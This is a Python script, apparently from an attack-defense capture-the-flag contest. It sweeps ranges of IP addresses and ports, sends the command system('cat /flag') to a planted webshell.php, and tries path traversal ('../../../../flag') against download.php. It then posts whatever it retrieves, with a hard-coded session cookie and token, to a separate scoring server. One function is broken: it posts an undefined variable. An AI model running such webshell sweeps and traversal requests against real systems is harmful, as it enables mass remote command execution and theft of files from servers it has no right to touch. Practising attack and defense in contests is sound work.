import requests
import re
import time

def submit_flag(flag):
    url = 'http://129.204.89.21:9090/'
    headers = {'Host': '39.100.119.37:10000','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-Requested-With': 'XMLHttpRequest','Connection': 'close','Referer': 'http://39.100.119.37:10000/admin','Cookie': 'PHPSESSID=7loc4cqkqudv3v0g85a0h77586'}
    data = {"flag":flag,"token":"1f208fe1a06b1d6db7ff6b7a7db3aefe"}
    print(data)
    # data1 = str('{"flag":"{}"').format(flag)+',"token":"8c7889befd2f3bf81d23e0f0b4a9c831"}' #语法错误
    time.sleep(3)
    req = requests.post(url,data=data,headers=headers)
    print(req.text)
def submit_flag_json(flag):
    url = 'http://129.204.89.21:9090/api'
    headers = {'Host': '39.100.119.37:10000','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/json; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','Connection': 'close','Referer': 'http://39.100.119.37:10000/admin','Cookie': 'PHPSESSID=7loc4cqkqudv3v0g85a0h77586'}
    data = '{"flag":"' + flag + '","token":"1f208fe1a06b1d6db7ff6b7a7db3aefe"}'   #json格式
    print(data)
    # data1 = str('{"flag":"{}"').format(flag)+',"token":"8c7889befd2f3bf81d23e0f0b4a9c831"}' #语法错误
    req = requests.post(url,data=data,headers=headers)
    print(req.text)
    
def get_flag_by_post():
    for _ in range(1,13):
        if _ <10:
            _ = '0'+ str(_)
        _ = str(_)
       
        url = "http://129.204.89.21:88{}/webshell.php".format(_)
        #post_data = {'filename':'../../../../flag'}
        post_data = {"moxiaoxi":"system('cat /flag');"}
        print(url)

        req = requests.post(url=url,data=post_data)
        if req.status_code ==404:
            continue
        submit_flag(req.text)

def get_flag_by_post_ip():
    for _ in range(20,25):
        url = 'http://129.204.89.{}:8801/webshell.php'.format(_)
        post_data = {"moxiaoxi":"system('cat /flag');"}
        print(url)
        try:
            req = requests.post(url,data=post_data,timeout=3)
            if req.status_code == 404:
                continue
            submit_flag(req.text)
        except Exception as e:
            print(e)
            continue
        
# 如果要处理异常，函数可以这样写（但submit_flag如果出现异常，则无法得知，推荐先用上面的函数）
def get_flag_by_post2():
    for _ in range(1,13):
        if _ <10:
            _ = '0'+ str(_)
        _ = str(_)
        url = 'http://47.56.9.150:1{}80/download.php'.format(_)
        post_data = {'filename':'../../../../flag'}
        print(url)
        try:
            req = requests.post(url,data=data)
            if req.status_code == 404:
                continue
            submit_flag(req.text)
        except Exception as e:
            print(e)
            continue
if __name__ == "__main__":
    get_flag_by_post()
    #time.sleep(3)     #延时函数
